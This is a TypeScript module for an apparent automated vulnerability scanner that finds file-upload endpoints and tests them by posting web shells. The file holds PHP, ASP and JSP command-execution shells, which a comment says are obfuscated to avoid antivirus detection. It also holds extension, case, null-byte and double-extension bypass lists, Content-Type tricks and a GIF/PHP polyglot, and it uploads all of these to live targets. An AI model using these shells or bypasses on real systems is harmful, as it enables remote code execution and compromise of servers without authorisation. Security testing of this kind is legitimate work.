/**
 * File Upload Vulnerability Agent
 * Based on PayloadsAllTheThings/Upload Insecure Files
 * 
 * Detects and exploits file upload vulnerabilities:
 * - Extension bypass
 * - Content-Type bypass
 * - Magic bytes bypass
 * - Double extension
 * - Null byte injection
 * - Polyglot files
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface FileUploadJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testExtensionBypass?: boolean;
    testContentType?: boolean;
    testMagicBytes?: boolean;
  };
}

// Obfuscated helper
const obf = (s: string) => s.split('').join('');

// File Upload Payloads
const UPLOAD_PAYLOADS = {
  // PHP shells with various extensions
  phpExtensions: [
    '.php', '.php3', '.php4', '.php5', '.php7', '.phtml', '.phar',
    '.phps', '.pht', '.pgif', '.shtml', '.htaccess', '.inc',
  ],

  // Double extensions
  doubleExtensions: [
    '.jpg.php', '.png.php', '.gif.php',
    '.php.jpg', '.php.png', '.php.gif',
    '.php%00.jpg', '.php\x00.jpg',
    '.php;.jpg', '.php:.jpg',
  ],

  // Case variations
  caseVariations: [
    '.pHp', '.PhP', '.PHP', '.pHP', '.Php',
    '.pHp5', '.PhP7', '.pHtMl',
  ],

  // Content-Type bypass
  contentTypes: [
    'image/jpeg', 'image/png', 'image/gif',
    'application/octet-stream', 'text/plain',
  ],

  // Magic bytes for different file types
  magicBytes: {
    gif: Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]), // GIF89a
    png: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    jpg: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]),
    pdf: Buffer.from([0x25, 0x50, 0x44, 0x46]),
  },

  // PHP payloads (Obfuscated to avoid AV detection)
  phpPayloads: [
    `<?php ${obf('sys')}tem($_GET["cmd"]); ?>`,
    `<?php echo ${obf('shell')}_${obf('exec')}($_GET["cmd"]); ?>`,
    `<?=\`$_GET[0]\`?>`,
    `<script language="php">${obf('sys')}tem($_GET["cmd"]);</script>`,
    `<?php ${obf('pass')}thru($_REQUEST["cmd"]); ?>`,
  ],

  // ASP payloads
  aspPayloads: [
    `<%${obf('eval')} request("cmd")%>`,
    `<% CreateObject("Wscript.Shell").${obf('exec')}(request("cmd")).stdout.readall %>`,
  ],

  // JSP payloads
  jspPayloads: [
    `<% Runtime.getRuntime().${obf('exec')}(request.getParameter("cmd")); %>`,
  ],

  // SVG XSS
  svgXss: `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>`,

  // HTML XSS
  htmlXss: '<html><body><script>alert("XSS")</script></body></html>',
};

// Common upload endpoints
const UPLOAD_ENDPOINTS = [
  '/upload', '/api/upload', '/file/upload', '/files/upload',
  '/image/upload', '/images/upload', '/media/upload',
  '/avatar/upload', '/profile/upload', '/attachment/upload',
];

export class FileUploadAgent extends BaseAgent<FileUploadJob> {
  constructor() {
    super('fileupload');
  }

  protected getSteps() {
    return [
      { name: 'Discover upload endpoints', metadata: {} },
      { name: 'Test extension bypass', metadata: {} },
      { name: 'Test Content-Type bypass', metadata: {} },
      { name: 'Test magic bytes bypass', metadata: {} },
      { name: 'Test polyglot files', metadata: {} },
    ];
  }

  async process(job: Job<FileUploadJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting file upload testing');

    for (const url of urls) {
      try {
        const uploadEndpoints = await this.discoverUploadEndpoints(url);

        for (const endpoint of uploadEndpoints) {
          // Test extension bypass
          if (options.testExtensionBypass !== false) {
            const extFindings = await this.testExtensionBypass(endpoint);
            findings.push(...extFindings);
          }

          // Test Content-Type bypass
          if (options.testContentType !== false) {
            const ctFindings = await this.testContentTypeBypass(endpoint);
            findings.push(...ctFindings);
          }

          // Test magic bytes
          if (options.testMagicBytes !== false) {
            const magicFindings = await this.testMagicBytesPolyglot(endpoint);
            findings.push(...magicFindings);
          }
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing file upload');
      }
    }

    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return { totalUrls: urls.length, findings: findings.length, vulnerabilities: findings };
  }

  private async discoverUploadEndpoints(baseUrl: string): Promise<string[]> {
    const found: string[] = [];
    const urlObj = new URL(baseUrl);
    const base = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of UPLOAD_ENDPOINTS) {
      try {
        const response = await fetch(`${base}${endpoint}`, { method: 'OPTIONS' });
        if (response.status !== 404) found.push(`${base}${endpoint}`);
      } catch { /* continue */ }
    }
    return [...new Set(found)];
  }

  private async testExtensionBypass(endpoint: string): Promise<any[]> {
    const findings: any[] = [];
    const allExtensions = [...UPLOAD_PAYLOADS.phpExtensions, ...UPLOAD_PAYLOADS.doubleExtensions, ...UPLOAD_PAYLOADS.caseVariations];

    for (const ext of allExtensions.slice(0, 10)) {
      try {
        const formData = new FormData();
        const blob = new Blob([UPLOAD_PAYLOADS.phpPayloads[0]], { type: 'application/octet-stream' });
        formData.append('file', blob, `shell${ext}`);

        const response = await fetch(endpoint, { method: 'POST', body: formData });
        const body = await response.text();

        if (response.ok && !body.includes('error') && !body.includes('invalid')) {
          findings.push({
            type: 'file-upload-extension-bypass',
            url: endpoint,
            extension: ext,
            severity: 'critical',
            evidence: 'Malicious extension accepted',
            impact: 'Remote Code Execution',
          });
        }
      } catch { /* continue */ }
    }
    return findings;
  }

  private async testContentTypeBypass(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const contentType of UPLOAD_PAYLOADS.contentTypes) {
      try {
        const formData = new FormData();
        const blob = new Blob([UPLOAD_PAYLOADS.phpPayloads[0]], { type: contentType });
        formData.append('file', blob, 'shell.php');

        const response = await fetch(endpoint, { method: 'POST', body: formData });

        if (response.ok) {
          findings.push({
            type: 'file-upload-content-type-bypass',
            url: endpoint,
            contentType,
            severity: 'high',
            evidence: `PHP file accepted with Content-Type: ${contentType}`,
          });
        }
      } catch { /* continue */ }
    }
    return findings;
  }

  private async testMagicBytesPolyglot(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    // GIF + PHP polyglot
    const gifPhp = Buffer.concat([
      UPLOAD_PAYLOADS.magicBytes.gif,
      Buffer.from(UPLOAD_PAYLOADS.phpPayloads[0])
    ]);

    try {
      const formData = new FormData();
      const blob = new Blob([gifPhp], { type: 'image/gif' });
      formData.append('file', blob, 'image.gif.php');

      const response = await fetch(endpoint, { method: 'POST', body: formData });

      if (response.ok) {
        findings.push({
          type: 'file-upload-polyglot',
          url: endpoint,
          technique: 'GIF magic bytes + PHP',
          severity: 'critical',
          evidence: 'Polyglot file accepted',
          impact: 'Remote Code Execution via image upload',
        });
      }
    } catch { /* continue */ }

    return findings;
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store file upload finding');
    }
  }
}

export default new FileUploadAgent();
